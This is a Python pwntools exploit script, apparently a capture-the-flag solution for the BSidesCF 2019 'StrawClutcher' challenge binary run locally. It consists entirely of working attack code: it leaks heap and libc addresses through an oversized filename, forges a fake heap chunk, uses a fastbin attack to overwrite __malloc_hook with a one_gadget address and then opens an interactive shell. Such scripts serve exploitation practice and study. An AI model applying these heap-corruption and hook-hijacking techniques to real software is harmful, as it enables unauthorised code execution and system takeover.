from pwn import *
p = process('./data/bin/heap23_29_BSidesCF_2019_StrawClutcher')
elf = ELF('./data/bin/heap23_29_BSidesCF_2019_StrawClutcher')
libc_elf = elf.libc
one = [0x45226, 0x4527a, 0xf03a4, 0xf1247 ]
libc_start_main_ret = 0x20830

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def add(size:int, name:bytes, content:bytes):
    p.sendline(b'put '+ name + b' '+ str(size).encode())
    p.send(content)

def rename(name:bytes, new_name:bytes):
    p.sendline(b'rename '+ name + b' '+ new_name)

def delete(name:bytes):
    p.sendline(b'dele '+ name)

def leak():
    p.sendline(b'retr BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAx')
    p.recvuntil(b'A'*10)

    data = p.recv(0x78-10)
    heap = u64(data[-0x28:-0x20])
    libc_base = u64(data[-8:]) - 0x58 -0x10 - libc_elf.sym['__malloc_hook']
    libc_elf.address = libc_base
    print('libc:', hex(libc_base))
    return heap, libc_base

add(10, b'aaa.txt', b'A'*10);add(128, b'bbb.txt', b'A'*128);add(10, b'ccc.txt', b'A'*10)
rename(b'aaa.txt', b'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.EAx')
delete(b'bbb.txt')
heap, libc_base = leak()
add(128, b'bbb.txt', b'A'*128);add(80, b'null.txt', b'A'*80)
payload = b'fake.txt'.ljust(0x28, b'\x00')+ flat(0x68, heap+0x350, 0, heap+0x140)
add(72, b'true.txt', payload)
add(8, b'ptr.txt', b'A'*8)
add(104, b'A.txt', b'A'*104);add(104, b'B.txt', b'A'*104)
rename(b'ptr.txt', b'A.aa'.rjust(0x40, b'A')+ p8(0x50))
delete(b'fake.txt')
delete(b'B.txt')
delete(b'A.txt');p.recv()
add(104, b'A.txt', p64(libc_elf.sym['__malloc_hook'] - 0x23).ljust(0x68, b'\x00'));add(104, b'B.txt', p64(0).ljust(0x68, b'\x00'));add(104, b'C.txt', p64(0).ljust(0x68, b'\x00'))
one_gadget = libc_base + one[1];add(104, b'D.txt', (b'\x00'*(3+8+8)+ p64(one_gadget) ).ljust(0x68, b'\x00'));p.recv()
p.sendline(b'put E.txt 10');p.sendline(b'/bin/sh')
p.interactive()